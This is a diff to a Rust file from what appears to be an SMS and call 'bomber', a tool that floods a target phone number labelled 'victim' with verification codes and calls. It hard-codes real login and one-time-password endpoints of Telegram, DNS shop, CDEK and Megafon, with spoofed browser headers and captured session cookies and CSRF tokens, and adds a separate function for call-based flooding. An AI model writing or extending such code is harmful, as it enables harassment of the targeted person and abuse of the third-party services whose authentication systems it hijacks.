@@ -1,3 +1,4 @@
+use crate::phone::FormatterTypes::Without7;
 use crate::phone::{Country, FormatterTypes::WithPlus, Phone};
 use reqwest::header::HeaderMap;
 use reqwest::Method;
@@ -14,11 +15,11 @@ pub struct Service {
     pub body: serde_json::Value,
 }
 
-#[derive(Debug, Clone)]
+#[derive(Debug, Clone, PartialEq)]
 pub enum ServiceType {
     Sms,
     Call,
-    ServiceSms,
+    ServiceMessage,
 }
 
 #[allow(clippy::upper_case_acronyms)]
@@ -37,31 +38,31 @@ pub struct Victim {
     pub surname: String,
 }
 
-/*
-//
-{
-    let mut service = Service {
-        name: "".to_string(),
-        service_type: ServiceType::,
-        method: Method::,
-        url: "".to_string(),
-        headers: HeaderMap::new(),
-        body_type: BodyType::,
-        body: Default::default(),
-    };
+/// Example
+/// //
+/// {
+///     let mut service = Service {
+///         name: "".to_string(),
+///         service_type: ServiceType::,
+///         method: Method::,
+///         url: "".to_string(),
+///         headers: HeaderMap::new(),
+///         body_type: BodyType::,
+///         body: Default::default(),
+///     };
+///
+///     service.headers.insert("", r#""#.parse().unwrap());
+///
+///     let mut phone = victim.phone.clone();
+///     phone.format(WithPlus);
+///     service.body = json!({
+///         "phone": phone.phone
+///     });
+///
+///     services.push(service);
+/// }
 
-    service.headers.insert("", r#""#.parse().unwrap());
-
-    let mut phone = victim.phone.clone();
-    phone.format(WithPlus);
-    service.body = json!({
-        "phone": phone.phone
-    });
-
-    services.push(service);
-}
-*/
-
+/// List of SMS services and services messages
 pub fn construct_services_list(victim: Victim) -> Vec<Service> {
     let mut services = Vec::new();
 
@@ -71,7 +72,7 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
             {
                 let mut service = Service {
                     name: "Telegram".to_string(),
-                    service_type: ServiceType::ServiceSms,
+                    service_type: ServiceType::ServiceMessage,
                     method: Method::POST,
                     url: "https://my.telegram.org/auth/send_password".to_string(),
                     headers: HeaderMap::new(),
@@ -104,30 +105,6 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                 let phone = victim.phone.clone();
                 service.body = json!({
                     "phone": phone.phone
-                });
-
-                services.push(service);
-            }
-            // DNS
-            {
-                let mut service = Service {
-                    name: "DNS".to_string(),
-                    service_type: ServiceType::Call,
-                    method: Method::POST,
-                    url: "https://www.dns-shop.ru/auth/auth/fast-authorization/".to_string(),
-                    headers: HeaderMap::new(),
-                    body_type: BodyType::Form,
-                    body: Default::default(),
-                };
-
-                service.headers.insert("Cookie", r#"qrator_jsr=1723134943.891.bZA1mPLKscU7myr3-no9pgdc87rb1cc41j5c435122d4m4aee-00; qrator_ssid=1723134945.200.tB6sCNRMTxnS9mZT-th5o0b3bc8jr2ql6dc0ccp978iphttq5; qrator_jsid=1723134943.891.bZA1mPLKscU7myr3-k4tmm4n3g0v9ekubja8t83bea7frprd7; lang=ru; city_path=moscow; current_path=605bfdc517d7e9e23947448a9bf1ce16ac36b884434a3fdb10db053793c50392a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22current_path%22%3Bi%3A1%3Bs%3A115%3A%22%7B%22city%22%3A%2230b7c1f3-03fb-11dc-95ee-00151716f9f5%22%2C%22cityName%22%3A%22%5Cu041c%5Cu043e%5Cu0441%5Cu043a%5Cu0432%5Cu0430%22%2C%22method%22%3A%22manual%22%7D%22%3B%7D; phonesIdentV2=0c63b8e9-77d0-449f-b0dd-ec99e69c9dc6; cartUserCookieIdent_v3=1a84a07b671c1aecbf929fa9faafcbcb91ce57f6d1ea2adb6dcdce4cdbec3befa%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22cartUserCookieIdent_v3%22%3Bi%3A1%3Bs%3A36%3A%2265b0aa3b-e0f6-3c7e-beae-4715bf8b306c%22%3B%7D; _ab_=%7B%22catalog-filter-title-test%22%3A%22GROUP_2%22%7D; rrpvid=560296951004103; _ga_FLS4JETDHW=GS1.1.1723134957.1.1.1723134991.26.0.1400768249; _ga=GA1.1.298649215.1723134957; rcuid=66b4f3eeee55c15e759d7a55; tmr_lvid=fff40a89d5b30007c58d61cc405ab33b; tmr_lvidTS=1723134960450; _ym_uid=1723134961314038164; _ym_d=1723134961; _ym_isad=2; _ym_visorc=b; domain_sid=Dqj17u3-29WrUNyaTzlrr%3A1723134962861; tmr_detect=0%7C1723134968561; dnsauth_csrf=c02db7507fd5c3a7acba66f204a2934353e7910cdbeb6fa0dd3b4e94f0694389a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22dnsauth_csrf%22%3Bi%3A1%3Bs%3A36%3A%220085e58d-a105-4e76-b118-2a7bf227969a%22%3B%7D"#.parse().unwrap());
-
-                let mut phone = victim.phone.clone();
-                phone.format(WithPlus);
-                service.body = json!({
-                    "FastAuthorizationLoginLoadForm[login]": phone.phone,
-                    "FastAuthorizationLoginLoadForm[token]" : "",
-                    "FastAuthorizationLoginLoadForm[isPhoneCall]": 1
                 });
 
                 services.push(service);
@@ -215,30 +192,25 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
 
                 services.push(service);
             }
-            // CDEK
+
+            // Operators
+            // Megafon
             {
                 let mut service = Service {
-                    name: "CDEK".to_string(),
+                    name: "Megafon".to_string(),
                     service_type: ServiceType::Sms,
                     method: Method::POST,
-                    url: "https://www.cdek.ru/api-site/auth/send-code/".to_string(),
+                    url: "https://lk.megafon.ru/api/auth/otp/request".to_string(),
                     headers: HeaderMap::new(),
-                    body_type: BodyType::JSON,
+                    body_type: BodyType::Form,
                     body: Default::default(),
                 };
 
-                service
-                    .headers
-                    .insert("Host", r#"www.cdek.ru"#.parse().unwrap());
+                service.headers.insert("User-Agent", r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0"#.parse().unwrap());
                 service.headers.insert(
-                    "User-Agent",
-                    r#"Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0"#
-                        .parse()
-                        .unwrap(),
+                    "Accept",
+                    r#"application/json, text/plain, */*"#.parse().unwrap(),
                 );
-                service
-                    .headers
-                    .insert("Accept", r#"application/json"#.parse().unwrap());
                 service.headers.insert(
                     "Accept-Language",
                     r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
@@ -249,22 +221,32 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                 );
                 service
                     .headers
-                    .insert("Content-Type", r#"application/json"#.parse().unwrap());
-                service
-                    .headers
-                    .insert("Origin", r#"https://www.cdek.ru"#.parse().unwrap());
-                service.headers.insert("DNT", r#"1"#.parse().unwrap());
-                service.headers.insert("Sec-GPC", r#"1"#.parse().unwrap());
-                service
-                    .headers
-                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+                    .insert("Referer", r#"https://lk.megafon.ru/login"#.parse().unwrap());
                 service.headers.insert(
-                    "Referer",
-                    r#"https://www.cdek.ru/ru/?utm_referrer=https%3A%2F%2Fwww.google.com%2F"#
+                    "Content-Type",
+                    r#"application/x-www-form-urlencoded; charset=UTF-8"#
                         .parse()
                         .unwrap(),
                 );
-                service.headers.insert("Cookie", r#"qrator_jsr=v2.0.1725453696.816.5db9c67c9BA4mON6|wDhYa3zodgygc0VC|HPwsvW9Zuv1XfCTjvV4tOWRTid+B/ueiRN0EgCam/CHTpFE4F0yTC8XPiudRXVSm4ORlmY50slwKLtAp1E5CKQA5olwrAhCr9FEI6vtV52o=-AbEZ5HAjGZF97yfQPTUx5bcyS7g=-00; qrator_jsid2=v2.0.1725453696.816.5db9c67c9BA4mON6|zSGcWWCA9EQz5GL6|nApVRY7ukbEXgupPcTFQ+GTJlCMZC2VjqrBRV0RitGnPYCHxFbSdSYke3e66Tq0kyxo6cKqU0Qox4xhaJ43bcHK99Imhepi40tIOA+qSgqMNAAmdO39S752QMJFugMx+2+2pcvWJ6E1P/FtKWTQ42w==-DgUM8iSbc2kCmEpwxWOGRqDq4eU=; cdek-stick=1725453698.852.1097792.944145|4d286599a6e893574f6bcc8bc0b1b325; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-04%2015%3A41%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.cdek.ru%2Fru%2F%3Futm_referrer%3Dhttps%253A%252F%252Fwww.google.com%252F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-04%2015%3A41%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.cdek.ru%2Fru%2F%3Futm_referrer%3Dhttps%253A%252F%252Fwww.google.com%252F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%3B%20rv%3A129.0%29%20Gecko%2F20100101%20Firefox%2F129.0; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.cdek.ru%2Fru%2F%3Futm_referrer%3Dhttps%253A%252F%252Fwww.google.com%252F; cpss=eyJ0b2tlbiI6InBoaWVZaWFzaDNpUnUzYWgifQ%3D%3D; advcake_track_id=5f4de0a0-2094-c568-fc22-93d9f4a0ec55; advcake_session_id=f0fd745c-81ed-ab5e-dced-c802b2c3f81c; cityid=1095; flomni_5d713233e8bc9e000b3ebfd2={%22userHash%22:%2207e1e570-c44c-4dae-95ad-345ec15c138c%22}; advcake_track_url=%3D20240902HkU1OkM3cOcCDZXujDrn9yl7qqKKSZy53mBDf9HsdF9D7G7%2BPVEhFmAeB%2B5dJ9O%2F90Omkr%2Brs%2FlkV9P89Bwk8DyzSD0Bgnos%2BE9eREMKdrcnYDp0CXowZBtN8GUs9Hu%2F9QQzc20jZS%2B1FGFGjxRN7JqsMGzIq%2Bqe8B7Mj8rRRx%2FeMoM6Skh2Xr3nMauaGZ1AFSct7KvIFvGHxs49otWCxsISL0YzRYx%2Br7ddCaenntt21j9RH9ah4k1Qp1rqaCvXd6peIicu7nntoIoC26610Ed8jIdfQ5Y%2BYPt3KYDM7CKqfJf8NJnYVul4MHFzCb4xJxstXjj%2FM5LaXjKswS2Mdw71E189tQjil%2B00TuJ2VNVBIrbuoIfCkSNwDg5CnVJ6pQzXuP%2BLP1I1EWxN3cLZu3LYOP94yRP57pgp8pAfwtjmZ%2FWdNIidwUbnM%2BlXaXLeeo21OafI5wYgsJCG7fL1bP2dNbn56gWXhqi1x92zk51BVZmgANkxOsJeh2CM0vS5CLoBN4kCwU0u2QeGt0uR6LJxULOrf%2B8pkfbYWXXOVrQar2M2nUZyft54AhGeJEVD357eRj83i3ezxhHu4ahS43bbzz71BgWVNaEzJVfIi8otc2pAJE3kCuP2wPmVkggqU6vwCdKpxseBu33gIhU5%2BVzAosR5xWxdCrf9i4aSxkBXynY2b1zoT2o%3D"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("X-App-Type", r#"react_lk"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("X-Cabinet-Capabilities", r#"web-2020"#.parse().unwrap());
+                service.headers.insert(
+                    "traceparent",
+                    r#"00-3c12254297d2b3c78b6b333820442716-c1abbf0182398532-01"#
+                        .parse()
+                        .unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Origin", r#"https://lk.megafon.ru"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+                service.headers.insert("Cookie", r#"LB-lk.megafon.ru=ffffffff0978c6a545525d5f4f58455e445a4a423660; page_load_start=1723118955914; DEVICE-ID=ce6fe18a-64e7-45b6-84c3-f9a3cae5588a; CSRF-TOKEN=0b193280-3bfa-4104-8084-f002febc4cf4; JSESSIONID=dc7806f8-cb02-49c4-a4aa-2bcf7a0e22c6; AUTOLOGIN-CHAIN-SESSION-KEY=8fb705f1-2e73-4984-86da-f3c858d90454; USER-REFERENCE-ID=7lBhADJeoRq2AeHmdIG2hw; _ym_uid=1723118949631111238; _ym_d=1723118949; _ym_isad=2; _ymab_param=VxcsX2bLdzwzxnUVPLAxUnBMRoW6E9LXybZoebjUAX2SKTHMD_x0N-AqRpdoT-KTpUrNs8ccvFAvi2egoTqL6umIzBA"#.parse().unwrap());
                 service
                     .headers
                     .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
@@ -276,15 +258,49 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                     .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
                 service
                     .headers
-                    .insert("host", r#"www.cdek.ru"#.parse().unwrap());
+                    .insert("Priority", r#"u=0"#.parse().unwrap());
+
+                let mut phone = victim.phone.clone();
+                phone.format(Without7);
+                service.body = json!({
+                    "login": phone.phone,
+                    "captchaReady": true
+                });
+
+                services.push(service);
+            }
+        }
+    }
+
+    services
+}
+
+/// List of call services
+pub fn construct_call_services_list(victim: Victim) -> Vec<Service> {
+    let mut services = Vec::new();
+
+    match victim.phone.country {
+        Country::Ru => {
+            // DNS
+            {
+                let mut service = Service {
+                    name: "DNS".to_string(),
+                    service_type: ServiceType::Call,
+                    method: Method::POST,
+                    url: "https://www.dns-shop.ru/auth/auth/fast-authorization/".to_string(),
+                    headers: HeaderMap::new(),
+                    body_type: BodyType::Form,
+                    body: Default::default(),
+                };
+
+                service.headers.insert("Cookie", r#"qrator_jsr=1723134943.891.bZA1mPLKscU7myr3-no9pgdc87rb1cc41j5c435122d4m4aee-00; qrator_ssid=1723134945.200.tB6sCNRMTxnS9mZT-th5o0b3bc8jr2ql6dc0ccp978iphttq5; qrator_jsid=1723134943.891.bZA1mPLKscU7myr3-k4tmm4n3g0v9ekubja8t83bea7frprd7; lang=ru; city_path=moscow; current_path=605bfdc517d7e9e23947448a9bf1ce16ac36b884434a3fdb10db053793c50392a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22current_path%22%3Bi%3A1%3Bs%3A115%3A%22%7B%22city%22%3A%2230b7c1f3-03fb-11dc-95ee-00151716f9f5%22%2C%22cityName%22%3A%22%5Cu041c%5Cu043e%5Cu0441%5Cu043a%5Cu0432%5Cu0430%22%2C%22method%22%3A%22manual%22%7D%22%3B%7D; phonesIdentV2=0c63b8e9-77d0-449f-b0dd-ec99e69c9dc6; cartUserCookieIdent_v3=1a84a07b671c1aecbf929fa9faafcbcb91ce57f6d1ea2adb6dcdce4cdbec3befa%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22cartUserCookieIdent_v3%22%3Bi%3A1%3Bs%3A36%3A%2265b0aa3b-e0f6-3c7e-beae-4715bf8b306c%22%3B%7D; _ab_=%7B%22catalog-filter-title-test%22%3A%22GROUP_2%22%7D; rrpvid=560296951004103; _ga_FLS4JETDHW=GS1.1.1723134957.1.1.1723134991.26.0.1400768249; _ga=GA1.1.298649215.1723134957; rcuid=66b4f3eeee55c15e759d7a55; tmr_lvid=fff40a89d5b30007c58d61cc405ab33b; tmr_lvidTS=1723134960450; _ym_uid=1723134961314038164; _ym_d=1723134961; _ym_isad=2; _ym_visorc=b; domain_sid=Dqj17u3-29WrUNyaTzlrr%3A1723134962861; tmr_detect=0%7C1723134968561; dnsauth_csrf=c02db7507fd5c3a7acba66f204a2934353e7910cdbeb6fa0dd3b4e94f0694389a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22dnsauth_csrf%22%3Bi%3A1%3Bs%3A36%3A%220085e58d-a105-4e76-b118-2a7bf227969a%22%3B%7D"#.parse().unwrap());
 
                 let mut phone = victim.phone.clone();
                 phone.format(WithPlus);
                 service.body = json!({
-                    "locale": "ru",
-                    "websiteId": "ru",
-                    "phone": phone.phone,
-                    "token": null
+                    "FastAuthorizationLoginLoadForm[login]": phone.phone,
+                    "FastAuthorizationLoginLoadForm[token]" : "",
+                    "FastAuthorizationLoginLoadForm[isPhoneCall]": 1
                 });
 
                 services.push(service);
